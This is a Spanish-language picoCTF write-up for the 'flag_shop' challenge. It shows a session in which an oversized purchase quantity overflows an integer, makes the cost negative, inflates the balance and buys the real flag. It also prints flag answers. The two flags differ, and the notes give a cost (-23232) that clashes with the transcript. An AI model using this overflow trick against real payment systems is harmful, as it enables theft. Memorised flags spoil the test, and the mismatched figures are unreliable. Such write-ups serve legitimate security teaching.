# flag_shop

## Descripción

There's a flag shop selling stuff, can you buy a flag? [Source](https://challenge-files.picoctf.net/c_fickle_tempest/a688b629e6044019fb08e6323c70c4604d60853d771e5ae1137f90b0f1039056/store.c).
Connect with nc fickle-tempest.picoctf.net 65297.
## Solución

```
#El código tiene un error y nos aprovechamos de el 

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2500000

The final cost is: -2044967296

Your current balance after transaction: 2044968396

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_F6968F69}
```

picoCTF{m0n3y_bag5_44cFf530}
## Notas adicionales

En una opción del menú al introducir un número lo suficiente grande que no haga colapsar el programa hace que la flag pase de costar 900 a -23232 y permitiéndonos tener mas dinero para comprar la verdadera flag.
## Referencias
